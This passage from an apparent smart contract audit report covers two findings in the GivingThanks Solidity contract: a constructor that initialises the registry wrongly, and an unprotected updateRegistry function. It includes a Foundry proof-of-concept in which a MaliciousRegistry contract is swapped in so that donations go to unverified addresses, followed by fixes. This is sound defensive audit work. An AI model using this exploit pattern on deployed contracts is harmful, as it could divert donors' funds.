@@ -522,3 +522,237 @@ function testIsVerifiedWithUnverifiedCharity() public {
   ```
 
 By implementing these changes, the contract will correctly enforce the verification process, ensuring that only properly verified charities can receive donations, thereby protecting donors and maintaining trust in the platform.
+
+
+# M-04 Incorrect Initialization of `registry` in `GivingThanks` Constructor Causes Malfunction
+
+## Summary
+
+The `GivingThanks` contract incorrectly initializes the `registry` variable in its constructor by assigning it to `msg.sender` instead of using the `_registry` parameter provided. This error results in the `registry` variable pointing to the deployer's address rather than the actual `CharityRegistry` contract. Consequently, any calls to `registry.isVerified()` within the `GivingThanks` contract do not function as intended, leading to failures in the donation process.
+
+## Vulnerability Details
+
+**Affected Code:**
+
+```solidity
+constructor(address _registry) ERC721("DonationReceipt", "DRC") {
+    registry = CharityRegistry(msg.sender);
+    owner = msg.sender;
+    tokenCounter = 0;
+}
+```
+
+**Issue:**
+
+- The constructor is intended to set the `registry` variable to the address of the deployed `CharityRegistry` contract passed as `_registry`.
+- Instead, it incorrectly assigns `registry = CharityRegistry(msg.sender);`, which sets `registry` to the address of the deployer (`msg.sender`) of the `GivingThanks` contract.
+- This misassignment means that any interaction with `registry` within the contract refers to an incorrect address, causing functions like `registry.isVerified()` to fail or return incorrect results.
+
+**Proof of Concept:**
+
+When deploying the `GivingThanks` contract and attempting to use its `donate` function, the contract will fail to verify charities correctly because `registry` does not point to the actual `CharityRegistry` contract.
+
+## Impact
+
+- **Functional Failure:** The `donate` function relies on `registry.isVerified(charity)` to validate charities. With `registry` incorrectly set, this validation fails, and donations cannot be processed.
+- **User Frustration:** Donors attempting to contribute will encounter transaction failures, leading to a poor user experience.
+- **Operational Disruption:** The core functionality of the `GivingThanks` contract is compromised, hindering the platform's purpose.
+
+## Tools Used
+
+- **Manual Code Review:** Identified the incorrect assignment in the constructor.
+- **Testing Frameworks:** Simulated contract deployment and interactions to observe the malfunction.
+- **Solidity Compiler:** Checked for warnings and errors during compilation.
+
+## Recommendations
+
+- **Correct the Constructor Initialization:**
+
+  Update the constructor to properly assign the `_registry` parameter to the `registry` variable:
+
+  ```diff
+  constructor(address _registry) ERC721("DonationReceipt", "DRC") {
+  -   registry = CharityRegistry(msg.sender);
+  +   registry = CharityRegistry(_registry);
+      owner = msg.sender;
+      tokenCounter = 0;
+  }
+  ```
+
+By making this correction, the `GivingThanks` contract will function properly, allowing it to interact with the `CharityRegistry` contract as intended. This ensures that only verified charities can receive donations, maintaining the integrity and purpose of the platform.
+
+
+# M-05 Unrestricted Access to `updateRegistry` Allows Attackers to Replace Registry with Malicious Contract
+
+## Summary
+
+The `updateRegistry` function in the `GivingThanks` contract lacks proper access control, allowing anyone to change the `registry` address to an arbitrary contract. This vulnerability enables attackers to redirect donations to malicious addresses by replacing the registry with a contract that falsely verifies any address. As a result, unverified and potentially malicious charities can receive donations, compromising the integrity of the platform.
+
+## Vulnerability Details
+
+**Affected Code:**
+
+```solidity
+function updateRegistry(address _registry) public {
+    registry = CharityRegistry(_registry);
+}
+```
+
+**Issue:**
+
+- The `updateRegistry` function is publicly accessible and lacks access control modifiers.
+- Any user can call `updateRegistry` to set the `registry` to a contract they control.
+- By replacing the `registry` with a malicious contract that always returns `true` for `isVerified`, attackers can bypass the charity verification process.
+
+**Proof of Concept:**
+
+**Note:** Before running the test, ensure that the constructor in the `GivingThanks` contract is corrected to properly initialize the `registry` variable. Update the constructor as follows:
+
+```diff
+constructor(address _registry) ERC721("DonationReceipt", "DRC") {
+-   registry = CharityRegistry(msg.sender);
++   registry = CharityRegistry(_registry);
+    owner = msg.sender;
+    tokenCounter = 0;
+}
+```
+
+**Test Code:**
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "forge-std/Test.sol";
+import "../src/GivingThanks.sol";
+import "../src/CharityRegistry.sol";
+import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
+
+contract ChangeRegistryToAttacker is Test {
+    GivingThanks public charityContract;
+    CharityRegistry public registryContract;
+    address public admin;
+    address public charity;
+    address public donor;
+
+    function setUp() public {
+        // Initialize addresses
+        admin = makeAddr("admin");
+        charity = makeAddr("charity");
+        donor = makeAddr("donor");
+
+        // Deploy the CharityRegistry contract as admin
+        vm.prank(admin);
+        registryContract = new CharityRegistry();
+
+        // Deploy the GivingThanks contract with the corrected constructor
+        vm.prank(admin);
+        charityContract = new GivingThanks(address(registryContract));
+
+        // Register and verify the charity
+        vm.prank(admin);
+        registryContract.registerCharity(charity);
+
+        vm.prank(admin);
+        registryContract.verifyCharity(charity);
+    }
+
+    function testChangeRegistryToAttacker() public {
+        MaliciousRegistry maliciousRegistry = new MaliciousRegistry();
+        address attacker = makeAddr("attacker");  
+
+        // Change the registry address to the attacker's malicious registry
+        vm.prank(attacker);
+        charityContract.updateRegistry(address(maliciousRegistry));
+
+        // Now, the donate function will accept any address as a verified charity
+        // Create a new address that is not registered or verified
+        address newCharity = makeAddr("newCharity");
+
+        // Fund the donor
+        vm.deal(donor, 10 ether);
+
+        // Donor donates to the unverified newCharity
+        vm.prank(donor);
+        charityContract.donate{value: 10 ether}(newCharity);
+
+        // Verify that the donation was sent to the newCharity
+        uint256 charityBalance = newCharity.balance;
+        assertEq(charityBalance, 10 ether);
+    }
+}
+
+/**
+ * @title MaliciousRegistry
+ * @dev A malicious implementation of a registry contract that always returns true for verification
+ */
+contract MaliciousRegistry {
+    function isVerified(address) public pure returns (bool) {
+        return true;
+    }
+}
+```
+
+**Explanation:**
+
+- **Constructor Correction:** The `GivingThanks` contract's constructor is fixed to properly set the `registry` variable.
+- **Attack Steps:**
+  - The attacker deploys a `MaliciousRegistry` contract that always returns `true` for `isVerified`.
+  - The attacker calls `updateRegistry` to replace the legitimate registry with the malicious one.
+  - A donor attempts to donate to an unverified and unregistered charity (`newCharity`), which is accepted due to the malicious registry.
+  - The `donate` function proceeds, and the unverified `newCharity` receives the donation.
+
+## Impact
+
+- **Bypass of Verification Process:** Attackers can approve any address as a verified charity.
+- **Financial Loss:** Donations can be redirected to malicious addresses, resulting in loss of funds intended for legitimate charities.
+- **Erosion of Trust:** The platform's integrity is compromised, leading to reputational damage and loss of user trust.
+
+## Tools Used
+
+- **Forge (Foundry):** For writing and executing the test case.
+- **Manual Code Review:** To identify the lack of access control in `updateRegistry`.
+- **Solidity Documentation:** Understanding of access control patterns and best practices.
+
+## Recommendations
+
+- **Restrict Access to `updateRegistry`:**
+
+  Implement access control to ensure only authorized users can call `updateRegistry`. For example, use the `onlyOwner` modifier from OpenZeppelin's `Ownable` contract:
+
+  ```diff
+  import "@openzeppelin/contracts/access/Ownable.sol";
+
+  contract GivingThanks is ERC721URIStorage, Ownable {
+      // ...
+
+      function updateRegistry(address _registry) public onlyOwner {
+          registry = CharityRegistry(_registry);
+      }
+  }
+  ```
+
+- **Set Ownership Properly:**
+
+  - Ensure that the contract owner is correctly set during deployment (typically to the deployer's address).
+  - Provide mechanisms to transfer ownership securely if needed.
+
+- **Implement Events for Registry Updates:**
+
+  - Emit an event when the registry is updated to provide transparency and allow monitoring.
+
+  ```solidity
+  event RegistryUpdated(address indexed previousRegistry, address indexed newRegistry);
+
+  function updateRegistry(address _registry) public onlyOwner {
+      emit RegistryUpdated(address(registry), _registry);
+      registry = CharityRegistry(_registry);
+  }
+  ```
+
+- **Audit Access Control Across All Functions:**
+
+  - Review all functions in the contract to ensure appropriate access controls are in place.
+  - Consider using modifiers to centralize access control logic.
+
+By implementing these recommendations, the `updateRegistry` function will be secured, preventing unauthorized users from replacing the registry with malicious contracts. This ensures that only verified charities can receive donations, maintaining the integrity and trustworthiness of the platform.
